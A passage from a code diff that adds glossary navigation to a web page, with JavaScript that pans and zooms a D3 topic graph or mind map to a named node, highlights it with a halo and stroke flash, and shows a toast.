+        const svgEl = document.getElementById('canvas-graph');
+        const W = (svgEl && svgEl.clientWidth)  || window.innerWidth;
+        const H = (svgEl && svgEl.clientHeight) || window.innerHeight;
+        const k = 1.6;
+        const tx = W / 2 - k * d.x;
+        const ty = H / 2 - k * d.y;
+        d3.select('#canvas-graph')
+          .transition().duration(650)
+          .call(graphZoom.transform, d3.zoomIdentity.translate(tx, ty).scale(k));
+      } else {
+        g.querySelector('circle') && g.querySelector('circle').scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    } catch(_) {}
+
+    // 2) Big halo ring + bold class on the node group
+    g.classList.remove('glossary-highlight');
+    void g.getBoundingClientRect();
+    g.classList.add('glossary-highlight');
+    try {
+      // remove any previous halo
+      g.querySelectorAll('circle.glossary-halo').forEach(c => c.remove());
+      const halo = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+      halo.setAttribute('class', 'glossary-halo');
+      halo.setAttribute('cx', '0');
+      halo.setAttribute('cy', '0');
+      halo.setAttribute('r', '14');
+      g.insertBefore(halo, g.firstChild); // behind the node circle
+    } catch(_) {}
+
+    // 3) Top-of-screen toast
+    showGlossaryToast('Topic Graph', label, 'graph');
+
+    setTimeout(() => {
+      g.classList.remove('glossary-highlight');
+      g.querySelectorAll('circle.glossary-halo').forEach(c => c.remove());
+    }, 4200);
+  };
+  requestAnimationFrame(() => requestAnimationFrame(() => tryFlash(0)));
+};
+
+window.glossaryJumpToMindmapNode = function(label) {
+  if (typeof switchTab === 'function') switchTab('mindmap');
+  const target = (label || '').replace(/\n/g, ' ').trim().toLowerCase();
+  const tryFlash = (attempt) => {
+    const groups = document.querySelectorAll('#canvas g');
+    let hit = null;
+    groups.forEach(g => {
+      if (hit) return;
+      const txt = (g.textContent || '').replace(/\s+/g, ' ').trim().toLowerCase();
+      if (txt === target) hit = g;
+    });
+    if (!hit) {
+      if (attempt < 10) return setTimeout(() => tryFlash(attempt + 1), 150);
+      return;
+    }
+
+    // 1) Pan the mindmap so the hit node is roughly centered
+    try {
+      if (typeof d3 !== 'undefined' && typeof mmZoom !== 'undefined') {
+        const svgEl = document.getElementById('canvas');
+        const W = (svgEl && svgEl.clientWidth)  || window.innerWidth;
+        const H = (svgEl && svgEl.clientHeight) || window.innerHeight;
+        // Read the node's local SVG position from its existing transform attribute (form: translate(x,y))
+        const tr = hit.getAttribute('transform') || '';
+        const m = tr.match(/translate\(\s*([-0-9.]+)\s*[ ,]\s*([-0-9.]+)/);
+        if (m) {
+          const x = parseFloat(m[1]), y = parseFloat(m[2]);
+          const k = 1.3;
+          const tx = W / 2 - k * x;
+          const ty = H / 2 - k * y;
+          d3.select('#canvas')
+            .transition().duration(650)
+            .call(mmZoom.transform, d3.zoomIdentity.translate(tx, ty).scale(k));
+        } else {
+          hit.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+      } else {
+        hit.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    } catch(_) {}
+
+    // 2) Halo ring on the mindmap node
+    try {
+      hit.querySelectorAll('circle.glossary-mm-halo').forEach(c => c.remove());
+      const halo = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+      halo.setAttribute('class', 'glossary-mm-halo');
+      halo.setAttribute('cx', '0');
+      halo.setAttribute('cy', '0');
+      halo.setAttribute('r', '14');
+      hit.insertBefore(halo, hit.firstChild);
+      setTimeout(() => halo.remove(), 4200);
+    } catch(_) {}
+
+    // 3) Stroke flash on the shape
+    const shape = hit.querySelector('circle, rect');
+    if (shape) {
+      const prev = shape.getAttribute('stroke');
+      const prevW = shape.getAttribute('stroke-width');
+      shape.setAttribute('stroke', '#f0c000');
+      shape.setAttribute('stroke-width', '5');
+      setTimeout(() => {
+        if (prev !== null) shape.setAttribute('stroke', prev); else shape.removeAttribute('stroke');
+        if (prevW !== null) shape.setAttribute('stroke-width', prevW); else shape.removeAttribute('stroke-width');
+      }, 3000);
+    }
+
+    // 4) Toast
+    showGlossaryToast('Mind Map', (label || '').replace(/\n/g, ' '), 'mindmap');
+  };
+  requestAnimationFrame(() => requestAnimationFrame(() => tryFlash(0)));
+};
+
+// Floating toast helper — visible regardless of where the target node ended up
+function showGlossaryToast(where, label, kind) {
+  let t = document.getElementById('glossary-toast');
+  if (!t) {
+    t = document.createElement('div');
+    t.id = 'glossary-toast';
+    document.body.appendChild(t);
+  }
+  const icon = kind === 'graph' ? '🔗' : (kind === 'mindmap' ? '📐' : '📖');
+  t.innerHTML = '<span class="gt-icon">' + icon + '</span>'
+              + '<span>Jumped to: <strong>' + (label || '').replace(/[<>&]/g, '') + '</strong></span>'
+              + '<span class="gt-sub">in ' + where + '</span>';
+  // restart animation
+  t.classList.remove('show');
+  void t.offsetWidth;
+  t.classList.add('show');
+  clearTimeout(t._hideTimer);
+  t._hideTimer = setTimeout(() => t.classList.remove('show'), 3200);
+}
+
+// Lazy-render hook
+if (typeof switchTab === 'function') {
+  const _origSwitchTab_gloss = switchTab;
+  switchTab = function(tab) { _origSwitchTab_gloss(tab); if (tab === 'glossary') renderGlossary(); };
+}
+// === END glossary v1 js ===
 </script>
 <!-- BEGIN tooltip-pin (click pins, click outside closes) -->
 <style>
